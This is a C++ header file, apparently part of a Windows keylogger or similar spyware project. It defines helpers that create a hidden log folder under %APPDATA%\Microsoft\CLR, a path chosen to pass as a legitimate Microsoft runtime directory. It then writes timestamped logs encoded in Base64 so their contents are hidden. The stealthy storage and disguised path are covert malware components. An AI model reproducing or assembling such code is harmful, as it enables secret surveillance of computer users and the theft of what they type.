#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include "windows.h"
#include "DLC.h"
#include "Base64Encoder.h"

namespace IO
{
    std::string GetOurPath (const bool append_separator = false)
    {
     std::string appdata_dir(getenv("APPDATA"));
     std::string full = appdata_dir + "\\Microsoft\\CLR";
     return full + (append_separator ? "\\" : "");
    }
    bool MkOneDr (std::string path)
    {
        return (bool)CreateDirectory(path.c_str(),NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }
    bool MKDir(std::string path)
    {
        for(char &c:path)
            if(c=='\\')
        {
            c='\0';
            if(!MkOneDr(path))
                return false;
            c='\\';
        }
        return true;
    }
    template <typename T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        DLC::DT dt;
        std::string name = dt.GetDtAsString("_") +  ".log";
        try
        {
            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "[" << dt.GetDtAsString() << "]" << std::endl << t << std::endl; //TODO DO DO
            std::string data = Base64Encoder::base64_encode(s.str());
            file << data;
            if(!file)
                return "";
                file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}
#endif // IO_H
